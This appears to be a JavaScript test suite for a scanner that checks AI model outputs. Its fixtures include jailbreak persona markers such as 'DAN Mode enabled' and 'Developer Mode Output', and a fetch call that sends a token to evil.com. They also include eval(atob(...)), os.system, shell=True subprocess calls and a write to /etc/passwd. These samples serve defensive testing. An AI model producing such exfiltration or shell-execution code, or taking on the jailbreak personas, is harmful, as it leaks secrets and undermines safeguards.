import { describe, it } from "node:test";
import assert from "node:assert/strict";

import {
  OUTPUT_BAN_SUBSTRINGS,
  scanBanSubstrings,
  scanRegex,
  extractUrls,
  scanUrls,
  scanDangerousCode,
  scanOutput,
} from "../dist/output-scanner.js";

describe("output-scanner.ts", () => {
  describe("scanBanSubstrings", () => {
    it("returns safe for empty input", () => {
      const result = scanBanSubstrings("");
      assert.equal(result.isSafe, true);
      assert.equal(result.alerts.length, 0);
    });

    it("detects DAN Mode enabled", () => {
      const output =
        "DAN Mode enabled. GPT: As an AI language model, my primary function is to assist.";
      const result = scanBanSubstrings(output, OUTPUT_BAN_SUBSTRINGS);
      assert.equal(result.isSafe, false);
      assert.ok(result.alerts.length > 0);
      assert.equal(result.alerts[0].pattern, "ban_substring");
    });

    it("detects jailbreak outputs", () => {
      const outputs = [
        "[DAN]",
        "DAN:",
        "successfully jailbroken",
        "STAN:",
        "DUDE:",
        "(🔓Developer Mode Output)",
      ];

      for (const output of outputs) {
        const result = scanBanSubstrings(output, OUTPUT_BAN_SUBSTRINGS);
        assert.equal(result.isSafe, false, `Should detect: ${output}`);
      }
    });

    it("detects EICAR test pattern", () => {
      const output = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
      const result = scanBanSubstrings(output, OUTPUT_BAN_SUBSTRINGS);
      assert.equal(result.isSafe, false);
    });

    it("detects GTUBE test pattern", () => {
      const output = "XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X";
      const result = scanBanSubstrings(output, OUTPUT_BAN_SUBSTRINGS);
      assert.equal(result.isSafe, false);
    });

    it("allows clean text", () => {
      const output = "Just a normal response about the weather.";
      const result = scanBanSubstrings(output, OUTPUT_BAN_SUBSTRINGS);
      assert.equal(result.isSafe, true);
    });

    it("respects custom substring list", () => {
      const result = scanBanSubstrings("forbidden word here", ["forbidden"]);
      assert.equal(result.isSafe, false);
    });

    it("handles case insensitivity", () => {
      const result = scanBanSubstrings("DAN mode enabled", ["dan mode enabled"], false);
      assert.equal(result.isSafe, false);
    });
  });

  describe("scanRegex", () => {
    it("returns safe for clean text", () => {
      const result = scanRegex("Just a output", ["Secret: \\w+"]);
      assert.equal(result.isSafe, true);
    });

    it("detects regex matches", () => {
      const result = scanRegex(
        "Here is an example: Bearer abc-def_123",
        ["Bearer [A-Za-z0-9-._~+/]+"],
      );
      assert.equal(result.isSafe, false);
      assert.ok(result.alerts.length > 0);
    });

    it("redacts matches when enabled", () => {
      const result = scanRegex(
        "Token: Bearer abc123",
        ["Bearer \\w+"],
        true,
        true,
      );
      assert.equal(result.redactedOutput, "Token: [REDACTED]");
    });

    it("handles multiple patterns", () => {
      const result = scanRegex(
        "Email: test@example.com | Token: Bearer abc",
        ["[\\w.-]+@[\\w.-]+", "Bearer \\w+"],
      );
      assert.equal(result.isSafe, false);
      assert.equal(result.alerts.length, 2);
    });

    it("handles invalid regex gracefully", () => {
      const result = scanRegex("test", ["[invalid"]);
      assert.equal(result.isSafe, true);
    });
  });

  describe("extractUrls", () => {
    it("extracts URLs from text", () => {
      const text = "Visit https://example.com or http://test.org for more info";
      const urls = extractUrls(text);
      assert.equal(urls.length, 2);
      assert.ok(urls.includes("https://example.com"));
      assert.ok(urls.includes("http://test.org"));
    });

    it("returns empty for no URLs", () => {
      const urls = extractUrls("No URLs here");
      assert.equal(urls.length, 0);
    });

    it("handles URLs with special characters", () => {
      const text = "Link: https://example.com/path?query=1&lang=en";
      const urls = extractUrls(text);
      assert.equal(urls.length, 1);
    });
  });

  describe("scanUrls", () => {
    it("returns safe for clean URLs", () => {
      const result = scanUrls("Check out https://google.com");
      assert.equal(result.isSafe, true);
    });

    it("detects suspicious domains", () => {
      const result = scanUrls("Visit https://evil.com/payload");
      assert.equal(result.isSafe, false);
      assert.equal(result.alerts[0].pattern, "suspicious_url");
    });

    it("detects subdomain attacks", () => {
      const result = scanUrls("Visit https://malicious.evil.com");
      assert.equal(result.isSafe, false);
    });

    it("returns safe for empty input", () => {
      const result = scanUrls("");
      assert.equal(result.isSafe, true);
    });
  });

  describe("scanDangerousCode", () => {
    it("detects eval with atob", () => {
      const code = "eval(atob('c3lzdGVtKCdjcHVzJyk='))";
      const result = scanDangerousCode(code);
      assert.equal(result.isSafe, false);
      assert.equal(result.alerts[0].pattern, "shell_exec");
    });

    it("detects subprocess with shell=True", () => {
      const code = "subprocess.run(['ls'], shell=True)";
      const result = scanDangerousCode(code);
      assert.equal(result.isSafe, false);
    });

    it("detects os.system", () => {
      const code = "import os; os.system('ls -la')";
      const result = scanDangerousCode(code);
      assert.equal(result.isSafe, false);
    });

    it("detects fetch exfiltration", () => {
      const code = "fetch('https://evil.com/exfiltrate?data=' + token)";
      const result = scanDangerousCode(code);
      assert.equal(result.isSafe, false);
      assert.equal(result.alerts[0].pattern, "exfil");
    });

    it("allows safe code", () => {
      const code = "def hello(): print('Hello, world!')";
      const result = scanDangerousCode(code);
      assert.equal(result.isSafe, true);
    });

    it("detects /etc/passwd access", () => {
      const code = "fs.writeFile('/etc/passwd', data)";
      const result = scanDangerousCode(code);
      assert.equal(result.isSafe, false);
    });
  });

  describe("scanOutput (combined)", () => {
    it("runs all scanners by default", () => {
      const result = scanOutput("normal text");
      assert.equal(result.isSafe, true);
    });

    it("respects options to disable scanners", () => {
      const result = scanOutput("DAN Mode enabled", {
        banSubstrings: false,
        scanUrls: false,
        scanCode: false,
      });
      // All disabled, so should be safe
      assert.equal(result.isSafe, true);
    });

    it("redacts when enabled", () => {
      const result = scanOutput("Secret: Bearer abc123", {
        regexPatterns: ["Bearer \\w+"],
        redact: true,
      });
      assert.equal(result.redactedOutput, "Secret: [REDACTED]");
    });
  });
});
